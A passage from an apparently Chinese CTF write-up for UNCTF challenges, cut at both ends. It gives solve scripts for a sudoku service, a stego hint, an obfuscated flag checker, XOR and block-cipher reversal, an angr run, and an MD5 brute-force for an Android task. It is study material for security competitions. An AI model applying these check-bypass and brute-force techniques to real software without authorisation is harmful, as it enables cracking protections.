class="number">2</span>+<span class="number">9</span>]</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,len(tmp),<span class="number">2</span>):</span><br><span class="line">        print(tmp[j])</span><br><span class="line">        <span class="keyword">if</span> tmp[j] != <span class="string">' '</span>:</span><br><span class="line">            sudoku[i*<span class="number">9</span>+count] = int(tmp[j])</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        tmp.append(sudoku[i*<span class="number">9</span>+j])</span><br><span class="line">    b.append(tmp)</span><br><span class="line">print(b)</span><br><span class="line">c = [<span class="number">0</span>] * <span class="number">81</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        c[i*<span class="number">9</span>+j] = b[i][j]</span><br><span class="line">print(c)</span><br><span class="line">s = Suku(b)</span><br><span class="line">sudoku1 = s.go()</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> c[i*<span class="number">9</span>+j] == <span class="number">0</span>:</span><br><span class="line">            tmp += str(sudoku1[i*<span class="number">9</span>+j])</span><br><span class="line">            <span class="keyword">if</span> j != <span class="number">8</span>:</span><br><span class="line">                tmp += <span class="string">','</span></span><br><span class="line">    print(tmp)</span><br><span class="line">    hgh.sendline(tmp)</span><br><span class="line">    <span class="keyword">print</span> hgh.recvline()</span><br><span class="line"><span class="keyword">print</span> hgh.recvall()</span><br></pre></td></tr></table></figure>



<h3 id="信号不好我先挂了"><a href="#信号不好我先挂了" class="headerlink" title="信号不好我先挂了"></a>信号不好我先挂了</h3><h4 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h4><p>信号不好我先挂了。 Flag交不上，多换几种格式。</p>
<h4 id="解决-6"><a href="#解决-6" class="headerlink" title="解决"></a>解决</h4><p>png的lsb隐写，里面有一个zip，解压里面还有一张图片，看上去和原始的图片一样，盲水印隐写。。。。</p>
<h3 id="Think"><a href="#Think" class="headerlink" title="Think"></a>Think</h3><h4 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h4><p>送分题</p>
<h4 id="解决-7"><a href="#解决-7" class="headerlink" title="解决"></a>解决</h4><p>修改判断即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"""</span></span><br><span class="line"><span class="string">  ____   ___  _  ___    _   _ _   _  ____ _____ _____ </span></span><br><span class="line"><span class="string"> |___ \ / _ \/ |/ _ \  | | | | \ | |/ ___|_   _|  ___|</span></span><br><span class="line"><span class="string">   __) | | | | | (_) | | | | |  \| | |     | | | |_   </span></span><br><span class="line"><span class="string">  / __/| |_| | |\__, | | |_| | |\  | |___  | | |  _|  </span></span><br><span class="line"><span class="string"> |_____|\___/|_|  /_/   \___/|_| \_|\____| |_| |_|    </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">lambda</span> __y, __operator, __g, __print: [[[[(__print(<span class="string">"It's a simple question. Take it easy. Don't think too much about it."</span>), [(check(checknum), <span class="literal">None</span>)[<span class="number">1</span>] <span class="keyword">for</span> __g[<span class="string">'checknum'</span>] <span class="keyword">in</span> [(<span class="number">0</span>)]][<span class="number">0</span>])[<span class="number">1</span>] <span class="keyword">for</span> __g[<span class="string">'check'</span>], check.__name__ <span class="keyword">in</span> [(<span class="keyword">lambda</span> checknum: (<span class="keyword">lambda</span> __l: [(<span class="keyword">lambda</span> __after: (__print(<span class="string">'Congratulation!'</span>), (__print(decrypt(key, encrypted)), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> <span class="keyword">not</span> __l[<span class="string">'checknum'</span>] <span class="keyword">else</span> (__print(<span class="string">'Wrong!'</span>), __after())[<span class="number">1</span>])(<span class="keyword">lambda</span>: <span class="literal">None</span>) <span class="keyword">for</span> __l[<span class="string">'checknum'</span>] <span class="keyword">in</span> [(checknum)]][<span class="number">0</span>])(&#123;&#125;), <span class="string">'check'</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">'decrypt'</span>], decrypt.__name__ <span class="keyword">in</span> [(<span class="keyword">lambda</span> key, encrypted: (<span class="keyword">lambda</span> __l: [[(<span class="keyword">lambda</span> __after, __sentinel, __items: __y(<span class="keyword">lambda</span> __this: <span class="keyword">lambda</span>: (<span class="keyword">lambda</span> __i: [[__this() <span class="keyword">for</span> __l[<span class="string">'c'</span>] <span class="keyword">in</span> [(__operator.iadd(__l[<span class="string">'c'</span>], chr((ord(__l[<span class="string">'key'</span>][(__l[<span class="string">'i'</span>] % len(__l[<span class="string">'key'</span>]))]) ^ ord(__l[<span class="string">'encrypted'</span>][__l[<span class="string">'i'</span>]].decode(<span class="string">'base64'</span>).decode(<span class="string">'hex'</span>))))))]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">'i'</span>] <span class="keyword">in</span> [(__i)]][<span class="number">0</span>] <span class="keyword">if</span> __i <span class="keyword">is</span> <span class="keyword">not</span> __sentinel <span class="keyword">else</span> __after())(next(__items, __sentinel)))())(<span class="keyword">lambda</span>: __l[<span class="string">'c'</span>], [], iter(range(len(__l[<span class="string">'encrypted'</span>])))) <span class="keyword">for</span> __l[<span class="string">'c'</span>] <span class="keyword">in</span> [(<span class="string">''</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">'key'</span>], __l[<span class="string">'encrypted'</span>] <span class="keyword">in</span> [(key, encrypted)]][<span class="number">0</span>])(&#123;&#125;), <span class="string">'decrypt'</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">'encrypted'</span>] <span class="keyword">in</span> [([<span class="string">'MTM='</span>, <span class="string">'MDI='</span>, <span class="string">'MDI='</span>, <span class="string">'MTM='</span>, <span class="string">'MWQ='</span>, <span class="string">'NDY='</span>, <span class="string">'NWE='</span>, <span class="string">'MDI='</span>, <span class="string">'NGQ='</span>, <span class="string">'NTI='</span>, <span class="string">'NGQ='</span>, <span class="string">'NTg='</span>, <span class="string">'NWI='</span>, <span class="string">'MTU='</span>, <span class="string">'NWU='</span>, <span class="string">'MTQ='</span>, <span class="string">'MGE='</span>, <span class="string">'NWE='</span>, <span class="string">'MTI='</span>, <span class="string">'MDA='</span>, <span class="string">'NGQ='</span>, <span class="string">'NWM='</span>, <span class="string">'MDE='</span>, <span class="string">'MTU='</span>, <span class="string">'MDc='</span>, <span class="string">'MTE='</span>, <span class="string">'MGM='</span>, <span class="string">'NTA='</span>, <span class="string">'NDY='</span>, <span class="string">'NTA='</span>, <span class="string">'MTY='</span>, <span class="string">'NWI='</span>, <span class="string">'NTI='</span>, <span class="string">'NDc='</span>, <span class="string">'MDI='</span>, <span class="string">'NDE='</span>, <span class="string">'NWU='</span>, <span class="string">'MWU='</span>])]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">'key'</span>] <span class="keyword">in</span> [(<span class="string">'unctf'</span>)]][<span class="number">0</span>])((<span class="keyword">lambda</span> f: (<span class="keyword">lambda</span> x: x(x))(<span class="keyword">lambda</span> y: f(<span class="keyword">lambda</span>: y(y)()))), __import__(<span class="string">'operator'</span>, level=<span class="number">0</span>), globals(), __import__(<span class="string">'__builtin__'</span>, level=<span class="number">0</span>).__dict__[<span class="string">'print'</span>])</span><br></pre></td></tr></table></figure>



<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="unctf-f-ck-re"><a href="#unctf-f-ck-re" class="headerlink" title="unctf_f@ck_re"></a>unctf_f@ck_re</h3><h4 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a>描述</h4><p>题目打不开了。。。</p>
<h4 id="解决-8"><a href="#解决-8" class="headerlink" title="解决"></a>解决</h4><p>没有捷径，手动一点点逆。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x2C</span>, <span class="number">0x21</span>, <span class="number">0x1E</span>, <span class="number">0x73</span>, <span class="number">0x32</span>, <span class="number">0x12</span>, <span class="number">0x72</span>, <span class="number">0x37</span>, <span class="number">0x10</span>, <span class="number">0x38</span>, <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">0x1D</span>, <span class="number">0x6B</span>, <span class="number">0x66</span>, <span class="number">0x79</span>, <span class="number">0x79</span>, <span class="number">0x26</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    a[i]  = a[i] ^ <span class="number">69</span></span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>):</span><br><span class="line">    b.append(<span class="number">0</span>)</span><br><span class="line">v16 = <span class="number">0</span></span><br><span class="line">v5 = [<span class="number">1</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>):</span><br><span class="line">    tmp = (<span class="number">6</span> * (v16 // <span class="number">6</span>) + v5[v16 % <span class="number">6</span>])</span><br><span class="line">    b[tmp] = a[i]</span><br><span class="line">    v16 = v16 + <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>):</span><br><span class="line">    print(chr(b[i]^i),end = <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = [<span class="number">204</span>,<span class="number">34</span>,<span class="number">127</span>,<span class="number">82</span>,<span class="number">82</span>,<span class="number">39</span>,<span class="number">170</span>,<span class="number">72</span>,<span class="number">52</span>,<span class="number">114</span>,<span class="number">95</span>,<span class="number">208</span>,<span class="number">15</span>,<span class="number">39</span>,<span class="number">107</span>,<span class="number">57</span>]</span><br><span class="line"></span><br><span class="line">b = [<span class="number">0x1B</span>,<span class="number">0x5D</span>,<span class="number">0x42</span>,<span class="number">0x2B</span>,<span class="number">0x0D</span>,<span class="number">0x5</span>,<span class="number">0x48</span>,<span class="number">0x0E6</span>,<span class="number">0x35</span>,<span class="number">0x16</span>,<span class="number">0x9E</span>,<span class="number">0x0B5</span>,<span class="number">0x0BB</span>,<span class="number">0x0E3</span>,<span class="number">0x24</span>,<span class="number">0x0F</span>,<span class="number">0x13</span>,<span class="number">0x0C0</span>,<span class="number">0x59</span>,<span class="number">0x96</span>,<span class="number">0x5A</span>,<span class="number">0x12</span>,<span class="number">0x2B</span>,<span class="number">0x0E0</span>,<span class="number">0x8F</span>,<span class="number">0x21</span>,<span class="number">0x8C</span>,<span class="number">0x52</span>,<span class="number">0x0DE</span>,<span class="number">0x92</span>,<span class="number">0x12</span>,<span class="number">0x84</span>,<span class="number">0x0A3</span>,<span class="number">0x0E2</span>,<span class="number">0x6E</span>,<span class="number">0x7B</span>,<span class="number">0x76</span>,<span class="number">0x0A2</span>,<span class="number">0x0F</span>,<span class="number">0x51</span>,<span class="number">0x93</span>,<span class="number">0x0A9</span>,<span class="number">0x78</span>,<span class="number">0x0AB</span>,<span class="number">0x5F</span>,<span class="number">0x5E</span>,<span class="number">0x16</span>,<span class="number">0x82</span>,<span class="number">0x72</span>,<span class="number">0x82</span>,<span class="number">0x26</span>,<span class="number">0x0D1</span>,<span class="number">0x26</span>,<span class="number">0x0D4</span>,<span class="number">0x9</span>,<span class="number">0x0BF</span>,<span class="number">0x74</span>,<span class="number">0x0DA</span>,<span class="number">0x0A7</span>,<span class="number">0x3E</span>,<span class="number">0x99</span>,<span class="number">0x2</span>,<span class="number">0x65</span>,<span class="number">0x0C3</span>,<span class="number">0x0B3</span>,<span class="number">0x0AD</span>,<span class="number">0x0E0</span>,<span class="number">0x5A</span>,<span class="number">0x0AB</span>,<span class="number">0x7A</span>,<span class="number">0x83</span>,<span class="number">0x93</span>,<span class="number">0x3F</span>,<span class="number">0x0A4</span>,<span class="number">0x11</span>,<span class="number">0x3D</span>,<span class="number">0x8E</span>,<span class="number">0x0D</span>,<span class="number">0x0DF</span>,<span class="number">0x5A</span>,<span class="number">0x71</span>,<span class="number">0x8</span>,<span class="number">0x3A</span>,<span class="number">0x0C8</span>,<span class="number">0x0F4</span>,<span class="number">0x90</span>,<span class="number">0x16</span>,<span class="number">0x1B</span>,<span class="number">0x88</span>,<span class="number">0x0C6</span>,<span class="number">0x50</span>,<span class="number">0x6F</span>,<span class="number">0x0D1</span>,<span class="number">0x0A4</span>,<span class="number">0x0B3</span>,<span class="number">0x73</span>,<span class="number">0x7B</span>,<span class="number">0x82</span>,<span class="number">0x0BF</span>,<span class="number">0x0B2</span>,<span class="number">0x5F</span>,<span class="number">0x94</span>,<span class="number">0x0DE</span>,<span class="number">0x0CA</span>,<span class="number">0x5A</span>,<span class="number">0x5E</span>,<span class="number">0x0AB</span>,<span class="number">0x25</span>,<span class="number">0x0BE</span>,<span class="number">0x8C</span>,<span class="number">0x1B</span>,<span class="number">0x80</span>,<span class="number">0x65</span>,<span class="number">0x9E</span>,<span class="number">0x0EC</span>,<span class="number">0x5A</span>,<span class="number">0x37</span>,<span class="number">0x2A</span>,<span class="number">0x75</span>,<span class="number">0x2C</span>,<span class="number">0x2D</span>,<span class="number">0x0BA</span>,<span class="number">0x56</span>,<span class="number">0x0D0</span>,<span class="number">0x0BA</span>,<span class="number">0x3A</span>,<span class="number">0x0B6</span>,<span class="number">0x94</span>,<span class="number">0x81</span>,<span class="number">0x70</span>,<span class="number">0x87</span>,<span class="number">0x75</span>,<span class="number">0x3D</span>,<span class="number">0x48</span>,<span class="number">0x63</span>,<span class="number">0x7D</span>,<span class="number">0x52</span>,<span class="number">0x81</span>,<span class="number">0x39</span>,<span class="number">0x0B5</span>,<span class="number">0x23</span>,<span class="number">0x0D4</span>,<span class="number">0x0D3</span>,<span class="number">0x0DD</span>,<span class="number">0x4B</span>,<span class="number">0x0D9</span>,<span class="number">0x0B8</span>,<span class="number">0x35</span>,<span class="number">0x0A3</span>,<span class="number">0x0CA</span>,<span class="number">0x40</span>,<span class="number">0x77</span>,<span class="number">0x52</span>,<span class="number">0x7C</span>,<span class="number">0x9E</span>,<span class="number">0x6C</span>,<span class="number">0x42</span>,<span class="number">0x0D8</span>,<span class="number">0x53</span>,<span class="number">0x6F</span>,<span class="number">0x0EA</span>,<span class="number">0x2E</span>,<span class="number">0x0C</span>,<span class="number">0x9A</span>,<span class="number">0x0F3</span>,<span class="number">0x2A</span>,<span class="number">0x6A</span>,<span class="number">0x0D5</span>,<span class="number">0x0EA</span>,<span class="number">0x6B</span>,<span class="number">0x93</span>,<span class="number">0x2F</span>,<span class="number">0x18</span>,<span class="number">0x5C</span>,<span class="number">0x0BE</span>,<span class="number">0x96</span>,<span class="number">0x0B4</span>,<span class="number">0x26</span>,<span class="number">0x0F</span>,<span class="number">0x0DB</span>,<span class="number">0x9F</span>,<span class="number">0x7</span>,<span class="number">0x30</span>,<span class="number">0x0AF</span>,<span class="number">0x93</span>,<span class="number">0x34</span>,<span class="number">0x27</span>,<span class="number">0x8E</span>,<span class="number">0x0A</span>,<span class="number">0x0CA</span>,<span class="number">0x53</span>,<span class="number">0x0B7</span>,<span class="number">0x0C9</span>,<span class="number">0x8F</span>,<span class="number">0x9B</span>,<span class="number">0x40</span>,<span class="number">0x87</span>,<span class="number">0x54</span>,<span class="number">0x50</span>,<span class="number">0x53</span>,<span class="number">0x1E</span>,<span class="number">0x55</span>,<span class="number">0x6</span>,<span class="number">0x4</span>,<span class="number">0x87</span>,<span class="number">0x0C9</span>,<span class="number">0x5E</span>,<span class="number">0x78</span>,<span class="number">0x0A0</span>,<span class="number">0x3F</span>,<span class="number">0x66</span>,<span class="number">0x8</span>,<span class="number">0x0B0</span>,<span class="number">0x9</span>,<span class="number">0x6E</span>,<span class="number">0x83</span>,<span class="number">0x0E5</span>,<span class="number">0x6C</span>,<span class="number">0x23</span>,<span class="number">0x0E6</span>,<span class="number">0x74</span>,<span class="number">0x83</span>,<span class="number">0x1</span>,<span class="number">0x0A4</span>,<span class="number">0x7F</span>,<span class="number">0x62</span>,<span class="number">0x39</span>,<span class="number">0x9</span>,<span class="number">0x94</span>,<span class="number">0x32</span>,<span class="number">0x0D3</span>,<span class="number">0x88</span>,<span class="number">0x93</span>,<span class="number">0x61</span>,<span class="number">0x0C2</span>,<span class="number">0x0C6</span>,<span class="number">0x61</span>,<span class="number">0x6B</span>,<span class="number">0x28</span>,<span class="number">0x0C7</span>,<span class="number">0x61</span>,<span class="number">0x0DD</span>,<span class="number">0x0DB</span>,<span class="number">0x90</span>,<span class="number">0x0A9</span>,<span class="number">0x0D5</span>,<span class="number">0x0D8</span>,<span class="number">0x8A</span>,<span class="number">0x0A4</span>,<span class="number">0x0A0</span>,<span class="number">0x65</span>,<span class="number">0x0C1</span>,<span class="number">0x35</span>,<span class="number">0x41</span>,<span class="number">0x0BA</span>,<span class="number">0x0CF</span>,<span class="number">0x4A</span>,<span class="number">0x47</span>,<span class="number">0x0CA</span>,<span class="number">0x0AF</span>,<span class="number">0x51</span>,<span class="number">0x0E1</span>,<span class="number">0x72</span>,<span class="number">0x5A</span>,<span class="number">0x0BF</span>,<span class="number">0x1E</span>,<span class="number">0x0B3</span>,<span class="number">0x7A</span>,<span class="number">0x80</span>,<span class="number">0x0F2</span>,<span class="number">0x7A</span>,<span class="number">0x0CB</span>,<span class="number">0x25</span>,<span class="number">0x0E6</span>,<span class="number">0x98</span>,<span class="number">0x96</span>,<span class="number">0x1B</span>,<span class="number">0x53</span>,<span class="number">0x44</span>,<span class="number">0x0D8</span>,<span class="number">0x3C</span>,<span class="number">0x0AC</span>,<span class="number">0x12</span>,<span class="number">0x0B1</span>,<span class="number">0x64</span>,<span class="number">0x47</span>,<span class="number">0x35</span>,<span class="number">0x0</span>]</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    tmp = (e[<span class="number">4</span>*i] * <span class="number">0x1000000</span> + e[<span class="number">4</span>*i+<span class="number">1</span>] * <span class="number">0x10000</span> + e[<span class="number">4</span>*i+<span class="number">2</span>] * <span class="number">0x100</span> + e[<span class="number">4</span>*i+<span class="number">3</span>])</span><br><span class="line">    res.append(hex(tmp))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">right</span> <span class="params">(int_value,k,bit = <span class="number">32</span>)</span>:</span></span><br><span class="line">    bit_string = <span class="string">'&#123;:0%db&#125;'</span> % bit</span><br><span class="line">    bin_value = bit_string.format(int_value) <span class="comment"># 8 bit binary</span></span><br><span class="line">    bin_value = bin_value[-k:] + bin_value[:-k]</span><br><span class="line">    int_value = int(bin_value,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> int_value</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">left</span> <span class="params">(int_value,k,bit = <span class="number">32</span>)</span>:</span></span><br><span class="line"> bit_string = <span class="string">'&#123;:0%db&#125;'</span> % bit</span><br><span class="line"> bin_value = bit_string.format(int_value) <span class="comment"># 8 bit binary</span></span><br><span class="line"> bin_value = bin_value[k:] + bin_value[:k]</span><br><span class="line"> int_value = int(bin_value,<span class="number">2</span>)</span><br><span class="line"> <span class="keyword">return</span> int_value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun2</span><span class="params">(w)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">32</span>&lt;=w&lt;=<span class="number">126</span>:</span><br><span class="line">        <span class="keyword">return</span> chr(w)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span><span class="params">(w)</span>:</span></span><br><span class="line">    w4 = w % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">    w3 = (w % <span class="number">0x10000</span> - w4) //<span class="number">0x100</span></span><br><span class="line">    w2 = (w % <span class="number">0x1000000</span> -w3) // <span class="number">0x10000</span></span><br><span class="line">    w1 = (w // <span class="number">0x1000000</span>)</span><br><span class="line"></span><br><span class="line">    w4 = b[w4]</span><br><span class="line">    w3 = b[w3]</span><br><span class="line">    w2 = b[w2]</span><br><span class="line">    w1 = b[w1]</span><br><span class="line"></span><br><span class="line">    a = (w1 * <span class="number">0x1000000</span> + w2 * <span class="number">0x10000</span> + w3 * <span class="number">0x100</span> + w4 )</span><br><span class="line"></span><br><span class="line">    v2 = right(a, <span class="number">6</span>)</span><br><span class="line">    v3 = right(a, <span class="number">8</span>) ^ v2</span><br><span class="line">    v4 = left(a, <span class="number">10</span>) ^ v3</span><br><span class="line">    <span class="keyword">return</span> v4 ^ left(a, <span class="number">12</span>)</span><br><span class="line">res = [<span class="number">0xf276b39</span>, <span class="number">0x34725fd0</span>, <span class="number">0x5227aa48</span>, <span class="number">0xcc227f52</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    w = res[i+<span class="number">1</span>] ^ res[i+<span class="number">2</span>] ^ res[i+<span class="number">3</span>]</span><br><span class="line">    ans = fun1(w) ^ res[i+<span class="number">0</span>]</span><br><span class="line">    res.append((ans))</span><br><span class="line">print(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">a = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res[<span class="number">26</span>:<span class="number">30</span>]:</span><br><span class="line">    w4 = i % <span class="number">0x100</span></span><br><span class="line">    w3 = (i % <span class="number">0x10000</span> - w4) // <span class="number">0x100</span></span><br><span class="line">    w2 = (i % <span class="number">0x1000000</span> - w3) // <span class="number">0x10000</span></span><br><span class="line">    w1 = i // <span class="number">0x1000000</span></span><br><span class="line">    a += fun2(w1)</span><br><span class="line">    a += fun2(w2)</span><br><span class="line">    a += fun2(w3)</span><br><span class="line">    a += fun2(w4)</span><br><span class="line">print(a[::<span class="number">-1</span>])</span><br></pre></td></tr></table></figure>





<h3 id="奇怪的数组"><a href="#奇怪的数组" class="headerlink" title="奇怪的数组"></a>奇怪的数组</h3><h4 id="描述-9"><a href="#描述-9" class="headerlink" title="描述"></a>描述</h4><p><a href="https://xpro-adl.91ctf.com/userdownload?filename=1910255db2c901050ae.zip&amp;type=attach&amp;feature=custom" target="_blank" rel="noopener">https://xpro-adl.91ctf.com/userdownload?filename=1910255db2c901050ae.zip&amp;type=attach&amp;feature=custom</a></p>
<h4 id="解决-9"><a href="#解决-9" class="headerlink" title="解决"></a>解决</h4><p>只要会IDA就好。</p>
<p>看懂逻辑，将数据取出来，16进制数据顺序排一下就好。</p>
<h3 id="easyvm"><a href="#easyvm" class="headerlink" title="easyvm"></a>easyvm</h3><h4 id="描述-10"><a href="#描述-10" class="headerlink" title="描述"></a>描述</h4><p><a href="https://xpro-adl.91ctf.com/userdownload?filename=1910255db2c8fd2e603.zip&amp;type=attach&amp;feature=custom" target="_blank" rel="noopener">https://xpro-adl.91ctf.com/userdownload?filename=1910255db2c8fd2e603.zip&amp;type=attach&amp;feature=custom</a></p>
<h4 id="解决-10"><a href="#解决-10" class="headerlink" title="解决"></a>解决</h4><p>这个题我偷了一下懒，直接angr库跑的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">"easyvm"</span>)</span><br><span class="line">simgr = proj.factory.simgr()</span><br><span class="line">simgr.explore(find=<span class="keyword">lambda</span> s: <span class="string">b"Congratulations!"</span> <span class="keyword">in</span> s.posix.dumps(<span class="number">1</span>))</span><br><span class="line">f = open(<span class="string">'flag.txt'</span>,<span class="string">'wb'</span>)</span><br><span class="line">f.write(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line">print(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>



<h3 id="unctf-easy-Maze"><a href="#unctf-easy-Maze" class="headerlink" title="unctf_easy_Maze"></a>unctf_easy_Maze</h3><h4 id="描述-11"><a href="#描述-11" class="headerlink" title="描述"></a>描述</h4><p><a href="https://xpro-adl.91ctf.com/userdownload?filename=1910255db2c8feec529.zip&amp;type=attach&amp;feature=custom" target="_blank" rel="noopener">https://xpro-adl.91ctf.com/userdownload?filename=1910255db2c8feec529.zip&amp;type=attach&amp;feature=custom</a></p>
<h4 id="解决-11"><a href="#解决-11" class="headerlink" title="解决"></a>解决</h4><p>这个题目的难点在于将变换之后的迷宫拿出来，采取动态调试。但是OD只能跑32位的，所以用IDA pro的远程虚拟机调试功能即可。只要在第二轮迷宫变换后将迷宫的01数据取出（7*7），顺着1的路走就好。（wasd）</p>
<h3 id="Easy-Android"><a href="#Easy-Android" class="headerlink" title="Easy_Android"></a>Easy_Android</h3><h4 id="描述-12"><a href="#描述-12" class="headerlink" title="描述"></a>描述</h4><p>玩手机喽。</p>
<p><a href="https://xpro-adl.91ctf.com/userdownload?filename=1910255db2c9004c51d.zip&amp;type=attach&amp;feature=custom" target="_blank" rel="noopener">https://xpro-adl.91ctf.com/userdownload?filename=1910255db2c9004c51d.zip&amp;type=attach&amp;feature=custom</a></p>
<h4 id="解决-12"><a href="#解决-12" class="headerlink" title="解决"></a>解决</h4><p>apk反编译，查看jar包。注意jd-gui有一个类的一个函数反编译不了（就是MD5那个函数），多换几个反编译工具就好。</p>
<p>基本逻辑：</p>
<p>使用未知32位长的字符串和里面的假flag进行异或。将异或后的字符串，每4个一组，总共8组。对每组字符串进行MD5，MD5值是已知的，求解未知32位字符串。</p>
<p>由前面的逆向题推断，这32个字符串是由“0123456789abcdef”组成（或者大写）。</p>
<p>要不然根本不可能跑出来的。</p>
<p>爆破脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a =[ <span class="string">"2061e19de42da6e0de934592a2de3ca0"</span></span><br><span class="line">        , <span class="string">"a81813dabd92cefdc6bbf28ea522d2d1"</span></span><br><span class="line">        , <span 